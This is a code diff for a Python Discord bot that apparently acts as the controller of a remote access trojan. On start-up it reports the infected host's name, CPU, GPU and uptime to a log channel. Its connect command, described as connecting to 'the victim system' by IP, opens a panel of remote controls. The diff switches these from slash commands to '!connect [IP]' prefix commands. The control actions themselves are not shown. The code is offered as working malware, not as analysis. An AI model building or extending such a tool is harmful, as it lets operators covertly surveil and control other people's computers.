@@ -43,11 +43,7 @@ LOG_CHANNEL_ID = int(config['log_channel_id'])
 
 @bot.event
 async def on_ready():
-    try:
-        synced = await bot.tree.sync()
-        print(f"Synced {len(synced)} slash commands")
-    except Exception as e:
-        print(f"Failed to sync slash commands: {e}")
+    print(f"{bot.user} has connected to Discord!")
     
     channel = bot.get_channel(LOG_CHANNEL_ID)
     if channel:
@@ -82,15 +78,14 @@ async def on_ready():
         embed.add_field(name="CPU", value=cpu_info, inline=True)
         embed.add_field(name="GPU", value=gpu_info, inline=True)
         embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
-        embed.add_field(name="Commands", value="Use `/connect` slash command to access controls", inline=False)
+        embed.add_field(name="Commands", value="Use `!connect [IP]` command to access controls", inline=False)
         
         await channel.send(embed=embed)
 
-@bot.tree.command(name='connect', description='Connect to the victim system')
-@app_commands.describe(ip='IP address of the victim')
-async def connect_slash(interaction: discord.Interaction, ip: str):
-    if str(interaction.channel.id) != str(LOG_CHANNEL_ID):
-        await interaction.response.send_message("This command can only be used in the log channel.", ephemeral=True)
+@bot.command(name='connect')
+async def connect(ctx, ip: str):
+    if str(ctx.channel.id) != str(LOG_CHANNEL_ID):
+        await ctx.send("This command can only be used in the log channel.")
         return
     
     hostname = socket.gethostname()
@@ -116,8 +111,8 @@ async def connect_slash(interaction: discord.Interaction, ip: str):
     embed.add_field(name="GPU", value=gpu_info, inline=True)
     embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
     
-    view = ControlView(interaction.user.id)
-    await interaction.response.send_message(embed=embed, view=view)
+    view = ControlView(ctx.author.id)
+    await ctx.send(embed=embed, view=view)
 
 class ControlView(discord.ui.View):
     def __init__(self, author_id):
